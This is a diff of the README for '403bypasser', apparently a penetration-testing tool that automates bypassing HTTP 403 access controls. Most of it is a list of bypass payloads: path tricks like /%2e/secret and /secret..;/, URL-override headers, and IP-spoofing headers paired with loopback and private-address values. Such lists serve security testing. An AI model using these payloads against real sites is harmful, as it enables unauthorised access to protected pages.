@@ -7,35 +7,95 @@
 ## New README is coming...
 
 ## Türkçe
-**403bypasser**, erişim kısıtlaması bulunan sayfalardaki kısıtlamaları ve kontrolleri atlatmak amacıyla kullanılan teknikleri otomatize etmek için yazılmıştır. Bu araç geliştirilmeye devam edecektir, katkılara açıktır. 
+**403bypasser**, hedef sayfalardaki erişim kontrolü kısıtlamalarını aşmak için kullanılan teknikleri otomatikleştirir. Bu araç geliştirilmeye devam edecektir, katkılara açıktır. 
 
 ## English 
 
-**403bypasser** has been written to automate the techniques used to circumvent restrictions and access controls on restricted pages. **403bypasser** will continue to be improved and it is open to contributions.
+**403bypasser** automates the techniques used to circumvent access control restrictions on target pages. **403bypasser** will continue to be improved and it is open to contributions.
 
 ## Usage
 
 **Arguments:**<br>
-1.1 -u <single_url>&emsp;&emsp;&emsp;ex: /admin, admin, /admin/, admin/&emsp;403bypasser handles all these usages in the same way, it does not matter which one you prefer!<br>
--U <path_of_URL_list>
--d <single_directory>
--D <path_of_directory_list>
 
-| Argument | Description | Example | Note |
+| Argument | Description | Examples | Note |
 | -------- | ----------- | ------- | ---- |
-| -u | single URL to scan | http://example.com or http://example.com/ | All these example usages are handled in the same way |
+| -u | single URL to scan | http://example.com or http://example.com/ | All these example usages are interpreted in the same way |
+| -U | path to list of URLs | ./urllist.txt, ../../urllist.txt, etc.  | Just provide the path where the file is located :) |
+| -d | single directory to scan | /admin or admin or admin or /admin/ | All these example usages are interpreted in the same way |
+| -D | path to list of directories | ./dirlist.txt, ../../dirlist.txt, etc.  | Just provide the path where the file is located :) |
+
+**Usage 1:** `python3 403bypasser.py -u https://example.com -d /secret`
+**Usage 2:** `python3 403bypasser.py -u https://example.com -D dirlist.txt`
+**Usage 3:** `python3 403bypasser.py -U urllist.txt -d /secret`
+**Usage 4:** `python3 403bypasser.py -U urllist.txt -D dirlist.txt`
+
+> Since Python is a cross-platform language, one can run this program on different operating systems. 
+
+***
+
+## Release Notes
+**Changes in v2.0**: Considerable changes has been done in this version. The project is completely moved to Python 3 from Bash. New and wide variety of techniques have been added.
+**Changes in v1.1:** It's now possible to pass files (lists) to 403bypasser as input via arguments. Furthermore, two more test cases added: 
+poisoning with 1)`X-Original-URL` and 2)`X-Rewrite-URL` headers. 
+
+***
 
 ## Which Cases Does This Tool Check?
- 1. Testing `https://url.com/path`
- 2. Testing `https://url.com/%2e/path`
- 3. Testing `https://url.com/path/.`
- 4. Testing `https://url.com//path//`
- 5. Testing `https://url.com/./path/./`
- 6. Testing `https://url.com/path/`
- 7. Testing `https://url.com/path..;/`
- 8. Testing `https://url.com/path` with header poisoning `X-Custom-IP-Authorization: 127.0.0.1`
- 9. Testing `https://url.com/anything` with header poisoning `X-Original-URL: /directory`
-10. Testing `https://url.com` with header poisoning `X-Rewrite-URL: /directory`
 
-**Added Features in v1.1**: It's now possible to pass files (lists) to 403bypasser as input via arguments. Furthermore, two more test cases added: 
-poisoning with 1)`X-Original-URL` and 2)`X-Rewrite-URL` headers. 
+### 1. Request Method Manipulation
+- Convert GET request to POST request
+
+### 2. Path Manipulation
+- `/%2e/secret`
+- `/secret/`
+- `/secret..;/` 
+- `/secret/..;/`
+- `/secret%20`  
+- `/secret%09`
+- `/secret%00`
+- `/secret.json`
+- `/secret.css`
+- `/secret.html`
+- `/secret?`
+- `/secret??`
+- `/secret???`
+- `/secret?testparam`
+- `/secret#`
+- `/secret#test`
+- `/secret/.`
+- `//secret//`
+- `/./secret/./`
+
+### 3. Overriding the Target URL via Non-Standard Headers
+- `X-Original-URL: /secret`
+- `X-Rewrite-URL: /secret`
+
+### 4. Other Headers & Values 
+**Headers:** 
+- `X-Custom-IP-Authorization`
+- `X-Forwarded-For`
+- `X-Forward-For`
+- `X-Remote-IP`
+- `X-Originating-IP`
+- `X-Remote-Addr`
+- `X-Client-IP`
+- `X-Real-IP`
+
+**Values:**
+- `localhost`
+- `localhost:80`
+- `localhost:443`
+- `127.0.0.1`
+- `127.0.0.1:80`
+- `127.0.0.1:443`
+- `2130706433`
+- `0x7F000001`
+- `0177.0000.0000.0001`
+- `0`
+- `127.1`
+- `10.0.0.0`
+- `10.0.0.1`
+- `172.16.0.0`
+- `172.16.0.1`
+- `192.168.1.0`
+- `192.168.1.1`
